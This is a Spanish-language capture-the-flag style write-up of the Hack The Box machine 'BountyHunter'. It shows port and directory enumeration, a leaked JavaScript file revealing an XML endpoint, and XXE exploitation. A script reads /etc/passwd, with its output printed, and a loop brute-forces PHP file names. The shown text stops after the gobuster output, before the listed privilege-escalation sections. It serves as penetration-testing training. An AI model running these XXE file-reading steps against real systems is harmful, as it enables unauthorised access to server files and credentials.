<!doctype html><html lang=es><head><title>BountyHunter | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a inyeccción de entidades externas XML (XXE) además de permisios de sudo configurados. Para comprometer la máquina se necesitan conocimientos sobre XXE, PHP y Python. En este write-up se utiliza un script en Bash para leer archivos del servidor explotando el XXE"><meta name=robots content="index, follow"><meta name=image content="https://7rocky.github.io/images/HTB/BountyHunter/BountyHunter.png"><meta name=author content="7Rocky"><meta property="og:title" content="BountyHunter"><meta property="og:description" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a inyeccción de entidades externas XML (XXE) además de permisios de sudo configurados. Para comprometer la máquina se necesitan conocimientos sobre XXE, PHP y Python. En este write-up se utiliza un script en Bash para leer archivos del servidor explotando el XXE"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/htb/bountyhunter/"><meta property="article:section" content="htb"><meta property="article:published_time" content="2021-11-20T00:00:00+01:00"><meta property="article:modified_time" content="2022-03-11T17:26:40+01:00"><meta property="og:site_name" content="7Rocky"><meta property="og:image" content="https://7rocky.github.io/images/HTB/BountyHunter/BountyHunter.png"><meta property="og:author" content="7Rocky"><meta itemprop=name content="BountyHunter"><meta itemprop=description content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a inyeccción de entidades externas XML (XXE) además de permisios de sudo configurados. Para comprometer la máquina se necesitan conocimientos sobre XXE, PHP y Python. En este write-up se utiliza un script en Bash para leer archivos del servidor explotando el XXE"><meta itemprop=datePublished content="2021-11-20T00:00:00+01:00"><meta itemprop=dateModified content="2022-03-11T17:26:40+01:00"><meta itemprop=wordCount content="1622"><meta itemprop=keywords content="sudo,python,xxe,command-injection,password-reuse,"><meta name=twitter:card content="summary"><meta name=twitter:title content="BountyHunter"><meta name=twitter:description content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a inyeccción de entidades externas XML (XXE) además de permisios de sudo configurados. Para comprometer la máquina se necesitan conocimientos sobre XXE, PHP y Python. En este write-up se utiliza un script en Bash para leer archivos del servidor explotando el XXE"><meta name=twitter:image content="https://7rocky.github.io/images/HTB/BountyHunter/BountyHunter.png"><meta name=twitter:author content="7Rocky"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><link href=/css/main.css rel=stylesheet><script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script><script src=/js/main.js></script><div style=display:none>$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$</div></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/en/htb/bountyhunter/ title=en><img alt=en height=32px src=/images/en.png width=32px></a><ul class="pl0 ml3 mr3"><li class="list f5 f4-ns fw4 dib pr3"><a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr3"><a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr3"><a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/bountyhunter/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/bountyhunter/&text=BountyHunter" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/bountyhunter/&title=BountyHunter" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">BountyHunter</h1><time class="f6 mv4 dib tracked" datetime=2021-11-20T00:00:00+01:00>20 / 11 / 2021</time></header><div class=htb-image><img alt=BountyHunter src=/images/HTB/BountyHunter/BountyHunter.png></div><ul class="nested-links tags"><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/sudo title=sudo>sudo</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/python title=Python>Python</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/xxe title="Entidad Externa XML">Entidad Externa XML</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/command-injection title="Inyección de Comandos">Inyección de Comandos</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/password-reuse title="Reutilización de contraseñas">Reutilización de contraseñas</a></li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#explotando-un-xxe>Explotando un XXE</a></li><li><a href=#encontrando-una-contraseña-para-conectarnos-a-la-máquina>Encontrando una contraseña para conectarnos a la máquina</a></li><li><a href=#escalada-de-privilegios-con-sudo>Escalada de privilegios con <code>sudo</code></a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Fácil</li><li><strong>Dirección IP</strong>: 10.10.11.100</li><li><strong>Fecha</strong>: 24 / 07 / 2021</li></ul><h2 id=escaneo-de-puertos>Escaneo de puertos</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.11.100 -p 22,80
</span></span><span style=display:flex><span>Nmap scan report for 10.10.11.100
</span></span><span style=display:flex><span>Host is up (0.036s latency).
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
</span></span><span style=display:flex><span>|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
</span></span><span style=display:flex><span>|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
</span></span><span style=display:flex><span>|_http-title: Bounty Hunters
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
</span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 8.17 seconds
</span></span></code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).</p><h2 id=enumeración-web>Enumeración web</h2><p>Si accedemos a la página web en el puerto 80, veremos algo como lo siguiente:</p><p><img src=../../../images/HTB/BountyHunter/BountyHunter-web.png alt="BountyHunter web"></p><p>Si vamos a &ldquo;PORTAL&rdquo;, nos lleva a la siguiente página</p><p><img src=../../../images/HTB/BountyHunter/BountyHunter-portal.png alt="BountyHunter portal"></p><p>Y pinchando en &ldquo;here&rdquo;, vamos a un portal de desarrollo para generar una especie de reporte para <em>bug bounty</em>:</p><p><img src=../../../images/HTB/BountyHunter/BountyHunter-report.png alt="BountyHunter report"></p><p>Si rellenamos el formulario y lo enviamos, el servidor responde con los mismos datos y los imprime en la página:</p><p><img src=../../../images/HTB/BountyHunter/BountyHunter-report-data.png alt="BountyHunter report data"></p><p>Podemos hacer uso de <code>gobuster</code> para buscar rutas del servidor:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.100 -q 
</span></span><span style=display:flex><span>/resources            (Status: 301) [Size: 316] [--&gt; http://10.10.11.100/resources/]
</span></span><span style=display:flex><span>/assets               (Status: 301) [Size: 313] [--&gt; http://10.10.11.100/assets/]
</span></span><span style=display:flex><span>/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.100/css/]
</span></span><span style=display:flex><span>/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.11.100/js/]
</span></span><span style=display:flex><span>/server-status        (Status: 403) [Size: 276]
</span></span></code></pre></div><p>Encontramos que hay archivos interesantes en la ruta <code>/resources</code> (existe una vulnerabilidad de listado de directorios):</p><p><img src=../../../images/HTB/BountyHunter/BountyHunter-resources.png alt="BountyHunter resources"></p><p>Aquí podemos leer algunas tareas del desarrollador, pero nada interesante de momento:</p><p><img src=../../../images/HTB/BountyHunter/BountyHunter-tasks.png alt="BountyHunter tasks"></p><p>Sin embargo, hay un archivo interesante de JavaScript llamado <code>bountylog.js</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ curl http://10.10.11.100/resources/bountylog.js 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>returnSecret</span>(<span style=color:#a6e22e>data</span>) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> Promise.<span style=color:#a6e22e>resolve</span>(
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>$</span>.<span style=color:#a6e22e>ajax</span>({
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>type</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;POST&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>data</span><span style=color:#f92672>:</span> { <span style=color:#e6db74>&#34;data&#34;</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>data</span> },
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>url</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;tracker_diRbPr00f314.php&#34;</span>
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>  );
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>bountySubmit</span>() {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>xml</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt; 
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;bugreport&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;title&gt;</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#39;#exploitTitle&#39;</span>).<span style=color:#a6e22e>val</span>()<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/title&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;cwe&gt;</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#39;#cwe&#39;</span>).<span style=color:#a6e22e>val</span>()<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/cwe&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;cvss&gt;</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#39;#cvss&#39;</span>).<span style=color:#a6e22e>val</span>()<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/cvss&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;reward&gt;</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#39;#reward&#39;</span>).<span style=color:#a6e22e>val</span>()<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/reward&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;/bugreport&gt;`</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>data</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>returnSecret</span>(<span style=color:#a6e22e>btoa</span>(<span style=color:#a6e22e>xml</span>));
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#34;#return&#34;</span>).<span style=color:#a6e22e>html</span>(<span style=color:#a6e22e>data</span>)
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>catch</span>(<span style=color:#a6e22e>error</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;Error:&#39;</span>, <span style=color:#a6e22e>error</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Estas funciones se ejecutan al enviar el formulario de antes. Se están enviando los datos como documento XML a <code>tracker_diRbPr00f314.php</code>. Esto nos dice claramente que el vector de ataque es inyectar una Entidad Externa XML (XXE).</p><h2 id=explotando-un-xxe>Explotando un XXE</h2><p>Si el servidor es vulnerable a XXE, entonces podemos leer archivos del servidor si conocemos la ruta completa del archivo en cuestión.</p><p>Para explotar el XXE, se utiliza un <em>script</em> en Bash llamado <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/BountyHunter/xxe.sh><code>xxe.sh</code></a> que automatiza el proceso y extrae el contenido deseado (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/BountyHunter#xxesh>aquí</a>). La idea es leer archivos del servidor de la siguiente manera:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ bash xxe.sh /etc/passwd
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style=display:flex><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin 
</span></span><span style=display:flex><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
</span></span><span style=display:flex><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
</span></span><span style=display:flex><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
</span></span><span style=display:flex><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
</span></span><span style=display:flex><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
</span></span><span style=display:flex><span>sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style=display:flex><span>development:x:1000:1000:Development:/home/development:/bin/bash
</span></span><span style=display:flex><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
</span></span><span style=display:flex><span>usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span></code></pre></div><p>Para leer el contenido de los archivos PHP, podemos utilizar un <em>wrapper</em> para codificarlo en Base64 y decodificarlo después. Así, evitamos que aparezcan caracteres especiales de XML (como <code>&lt;</code> y <code>></code>).</p><p>Podemos probar algunas listas para explotar el LFI, pero ninguna es útil. Parace que tiene que haber información sensible en el código PHP, pero no hay nada interesante en los archivos que conocemos del servidor (<code>index.php</code>, <code>portal.php</code>, <code>log_submit.php</code> y <code>tracker_diRbPr00f314.php</code>, todos accesibles desde <code>/var/www/html</code>).</p><h2 id=encontrando-una-contraseña-para-conectarnos-a-la-máquina>Encontrando una contraseña para conectarnos a la máquina</h2><p>En este punto, podemos recordar que había tareas en el archivo <code>README.txt</code> relacionadas con una base de datos. Después de algunas pruebas, se descubre que el archivo <code>db.php</code> existe en el servidor.</p><p>Si no fuéramos capaces de adivinar el nombre del archivo, podemos probar muchas opciones con un bucle en Bash:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ <span style=color:#66d9ef>for</span> f in <span style=color:#66d9ef>$(</span>cat $WORDLISTS/dirbuster/directory-list-2.3-medium.txt<span style=color:#66d9ef>)</span>; <span style=color:#66d9ef>do</span> bash xxe.sh /var/www/html/$f.php | grep -v <span style=color:#e6db74>&#39;Nothing found&#39;</span> &amp;&gt;/dev/null <span style=color:#f92672>&amp;&amp;</span> echo Found: /var/www/html/$f.php; <span style=color:#66d9ef>done</span> 
</span></span><span style=display:flex><span>Found: /var/www/html/index.php
</span></span><span style=display:flex><span>Found: /var/www/html/portal.php
</span></span><span style=display:flex><span>Found: /var/www/html/db.php
</span></span></code></pre></div><p>Y otra manera sería volver al comando de <code>gobuster</code> y añadirle extensión PHP:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.100 -q -x php 
</span></span><span style=display:flex><span>/index.php            (Status: 200) [Size: 25169]
</span></span><span style=display:flex><span>/resources            (Status: 301) [Size: 316] [--&gt; http://10.10.11.100/resources/]
</span></span><span style=display:flex><span>/assets               (Status: 301) [Size: 313] [--&gt; http://10.10.11.100/assets/]
</span></span><span style=display:flex><span>/portal.php           (Status: 200) [Size: 125]
</span></span><span style=display:flex><span>/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.100/css/]
</span></span><span style=display:flex><span>/db.php               (Status: 200) [Size: 0]
</span></span><span style=display:flex><span>/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.11.100/js/]
</span></span><span style=display:flex><span>/server-status        (Status: 403) [Size: 276]
